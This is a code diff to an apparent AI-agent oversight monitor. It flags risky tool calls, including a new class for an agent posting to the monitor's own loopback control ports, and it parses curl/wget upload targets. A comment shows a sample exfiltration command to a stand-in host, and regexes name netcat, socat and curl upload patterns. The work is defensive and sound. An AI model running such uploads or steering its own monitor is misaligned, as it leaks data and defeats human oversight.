@@ -4,10 +4,15 @@
 //   taskFeatures(prompt)          — what the user's request MENTIONS: sites, paths, known service names,
 //                                   and a fixed three-word label set. Plaintext, in memory only; the
 //                                   caller hashes every feature before anything is written.
-//   actionTargets(tool, input, …) — whether a tool call is RISKY (egress / credentials / destructive /
-//                                   mcp-write) and, if so, what it targets.
-//   assessAlignment(task, action) — aligned iff the targets were mentioned (or, for the non-egress
-//                                   classes, the task carries the matching label).
+//   actionTargets(tool, input, …) — whether a tool call is RISKY (moorai-control / egress / credentials /
+//                                   destructive / mcp-write) and, if so, what it targets.
+//   assessAlignment(task, action) — aligned iff the targets were mentioned (or, for credentials, destructive
+//                                   and mcp-write, the task carries the matching label). moorai-control is
+//                                   never aligned: an upload to MoorAI's own loopback listeners (moorai-serve,
+//                                   the model proxy, the MCP gateway, at their default ports) is an agent
+//                                   writing its own task (POST /v1/task) or driving the control that judges it,
+//                                   whatever the task says. Uploads to any other loopback port stay out of
+//                                   scope (a local dev server).
 //
 // Deliberately lexical. It answers "did the user ever name this destination / file / service", not
 // "does this action serve the task". An upload to a host the user named is aligned even when it is
@@ -105,18 +110,87 @@ const UPLOAD = [
   /\bStart-BitsTransfer\b[^\n;|&]*?\s-TransferType\s{1,4}["']?Upload/i,
   UNC_COPY
 ];
+// MoorAI's own loopback listeners, at the ports the code listens on by default: moorai-serve
+// (cli/moorai-serve.mjs DEFAULTS.port), the model proxy (model-proxy/server.mjs DEFAULTS.port) and the MCP
+// gateway (mcp-gateway/config.mjs DEFAULT_PORT); test/intent-alignment-control.test.mjs keeps them equal. One
+// started on another port is not recognised.
+export const MOORAI_PORTS = Object.freeze([8790, 8791, 8848]);
+const MOORAI_PORT = new Set(MOORAI_PORTS.map(String));
+const LOOP_NAME = "localhost|127(?:\\.\\d{1,3}){3}|0\\.0\\.0\\.0|\\[::1\\]";
+const LOOP_URL = new RegExp(`\\b(?:https?|wss?):\\/\\/(?:[^\\s\\/@'"]{0,200}@)?(${LOOP_NAME}):(\\d{1,5})(?!\\d)`, "gi");
+const LOOP_NC = /\b(?:nc|ncat|netcat|telnet)\s+(?:-{1,2}[\w-]+\s+)*?(localhost|127(?:\.\d{1,3}){3}|0\.0\.0\.0|::1)\s+(\d{1,5})\b/gi;
+const LOOP_SOCAT = new RegExp(`\\btcp[46]?:(${LOOP_NAME}):(\\d{1,5})\\b`, "gi");
 const URL_HOST = /\b(?:https?|ftp|wss?):\/\/(?:[^\s\/@'"]{0,200}@)?(\[[0-9a-f:]{2,39}\]|[^\s\/:'"?#`)]{1,253})/gi;
 const NC_HOST = /\b(?:nc|ncat|netcat|telnet)\b(?:\s+-{1,2}[\w-]+(?:\s+\d+)?)*\s+([a-z0-9][\w.-]*\.[a-z][\w-]*|\d{1,3}(?:\.\d{1,3}){3})\b/gi;
 const REMOTE_COPY = /(?:^|\s)(?:[\w.-]+@)?([a-z0-9][\w-]*(?:\.[\w-]+)+):/gi;
 const SOCAT_HOST = /\btcp[46]?:([a-z0-9][\w.-]+):\d+/gi;
 
-function egressHosts(command) {
+// curl and wget take their destination as a bare argument too (`curl -d @f evil.example/up`): every argument
+// that is not a flag or a flag's value is a URL to them. The flags below take the NEXT argument as their value
+// (an output file, a header, a user, form data …); a short cluster whose value letter is last (-sSd) does too,
+// one with letters after it (-XPOST) carries its value. --url's value IS a destination. Quote-aware, linear in
+// the command, at most MAX_ARGS arguments per command and MAX_SITES hosts.
+const MAX_ARGS = 512, MAX_SITES = 64;
+const CURL_SEG = /\b(curl|wget)\b([^\n;|&]*)/gi;
+const VALUE_LONG = new Set(["--data", "--data-binary", "--data-raw", "--data-urlencode", "--data-ascii", "--json", "--form", "--form-string", "--upload-file",
+  "--header", "--proxy-header", "--output", "--output-dir", "--request", "--user", "--proxy-user", "--user-agent", "--referer", "--cookie", "--cookie-jar",
+  "--config", "--max-time", "--connect-timeout", "--write-out", "--proxy", "--cert", "--key", "--cacert", "--capath", "--resolve", "--connect-to",
+  "--interface", "--limit-rate", "--range", "--continue-at", "--quote", "--oauth2-bearer", "--netrc-file", "--unix-socket", "--abstract-unix-socket",
+  "--retry", "--retry-delay", "--retry-max-time", "--dump-header", "--trace", "--trace-ascii", "--stderr", "--variable", "--expand-url",
+  "--output-document", "--post-data", "--post-file", "--body-data", "--body-file", "--method", "--execute", "--input-file", "--directory-prefix",
+  "--password", "--http-user", "--http-password", "--append-output", "--output-file", "--tries", "--timeout", "--wait", "--level"]);
+// Short flags that take a value, per tool (they differ: curl -O and -i take none, wget -O and -i do).
+const VALUE_SHORT = { curl: new Set([..."AbcCdDeEFHKmoPQrtTuUwxXyYz"]), wget: new Set([..."oaOeiBtTwQUPlARDIX"]) };
+const BARE = /^(?:[^\s\/@]{1,64}@)?(\[[0-9a-f:]{2,39}\]|[a-z0-9][a-z0-9-]{0,62}(?:\.[a-z0-9-]{1,63}){0,16})(?::(\d{1,5}))?(?:[\/?#]|$)/i;
+function words(seg) {
+  const out = [];
+  let cur = "", q = "", has = false;
+  for (const ch of seg) {
+    if (q) { if (ch === q) q = ""; else cur += ch; continue; }
+    if (ch === "'" || ch === '"') { q = ch; has = true; continue; }
+    if (/\s/.test(ch)) { if (has || cur) { out.push(cur); if (out.length >= MAX_ARGS) return out; } cur = ""; has = false; continue; }
+    cur += ch; has = true;
+  }
+  if (has || cur) out.push(cur);
+  return out;
+}
+function bareTargets(command, add) {
+  for (const m of String(command).matchAll(CURL_SEG)) {
+    const short = VALUE_SHORT[m[1].toLowerCase()];
+    const w = words(m[2]);
+    for (let i = 0; i < w.length; i++) {
+      const t = w[i];
+      if (t === "--url") { if (i + 1 < w.length) add(w[++i], true); continue; }
+      if (t.startsWith("--")) { if (!t.includes("=") && VALUE_LONG.has(t)) i++; continue; }
+      if (t.startsWith("-") && t.length > 1) {
+        const k = [...t.slice(1)].findIndex((c) => short.has(c));
+        if (k >= 0 && k === t.length - 2) i++;
+        continue;
+      }
+      add(t, false);
+    }
+  }
+}
+
+// { hosts, control }: the remote hosts a command uploads to (loopback dropped), and the MoorAI loopback ports
+// it uploads to ("loopback:<port>").
+function egressTargets(command) {
   const c = String(command || "");
-  const hosts = new Set();
-  for (const re of [URL_HOST, NC_HOST, SOCAT_HOST]) for (const m of c.matchAll(re)) hosts.add(m[1].toLowerCase());
-  if (/\b(?:scp|rsync|sftp)\b/i.test(c)) for (const m of c.matchAll(REMOTE_COPY)) hosts.add(m[1].toLowerCase());
-  if (UNC_COPY.test(c)) for (const m of c.matchAll(UNC_HOST)) hosts.add(m[1].toLowerCase());
-  return [...hosts].filter((h) => !LOOPBACK.test(h) && h !== "wsl.localhost");
+  const hosts = new Set(), control = new Set();
+  const addHost = (h) => { if (hosts.size < MAX_SITES) hosts.add(h.toLowerCase()); };
+  for (const re of [URL_HOST, NC_HOST, SOCAT_HOST]) for (const m of c.matchAll(re)) addHost(m[1]);
+  if (/\b(?:scp|rsync|sftp)\b/i.test(c)) for (const m of c.matchAll(REMOTE_COPY)) addHost(m[1]);
+  if (UNC_COPY.test(c)) for (const m of c.matchAll(UNC_HOST)) addHost(m[1]);
+  for (const re of [LOOP_URL, LOOP_NC, LOOP_SOCAT]) for (const m of c.matchAll(re)) if (MOORAI_PORT.has(String(Number(m[2])))) control.add(`loopback:${Number(m[2])}`);
+  bareTargets(c, (arg, url) => {
+    if (!arg || arg.startsWith("@") || /[$`*?\\]/.test(arg) || arg.includes("://")) return;
+    const b = BARE.exec(arg);
+    if (!b) return;
+    const host = b[1].toLowerCase();
+    if (LOOPBACK.test(host)) { if (b[2] && MOORAI_PORT.has(String(Number(b[2])))) control.add(`loopback:${Number(b[2])}`); return; }
+    if (url || host.includes(".") || host.startsWith("[")) addHost(host);
+  });
+  return { hosts: [...hosts].filter((h) => !LOOPBACK.test(h) && h !== "wsl.localhost"), control: [...control] };
 }
 
 const MCP_WRITE = /(?:^|[_-])(?:create|update|delete|remove|send|post|write|push|publish|upload|comment|merge|add|edit|put|set|insert|close|reply|share|invite|move|rename|archive|transfer|execute|run|deploy|submit|patch)(?:[_-]|$)/i;
@@ -141,7 +215,9 @@ export function actionTargets(tool, input, findings) {
   if (tool === "Bash" || tool === "PowerShell") {
     const cmd = String(ti.command || "");
     if (UPLOAD.some((r) => r.test(cmd))) {
-      const sites = [...new Set(egressHosts(cmd).map(siteOf))];
+      const { hosts, control } = egressTargets(cmd);
+      if (control.length) return { cls: "moorai-control", sites: control, paths: [], names: [] };
+      const sites = [...new Set(hosts.map(siteOf))];
       if (sites.length) return { cls: "egress", sites, paths: [], names: [] };
     }
     if (ids.has(43)) return { cls: "destructive", sites: [], paths: commandPaths(cmd), names: [] };
@@ -173,6 +249,7 @@ export function featureKeys(features, h) {
 }
 
 export function assessAlignment(task, action, h) {
+  if (action.cls === "moorai-control") return { aligned: false, unmatched: action.sites.length, targets: action.sites.length };
   const has = (k) => task.has(h(k));
   if (action.cls === "egress") {
     const unmatched = action.sites.filter((s) => !has(`site:${s}`));
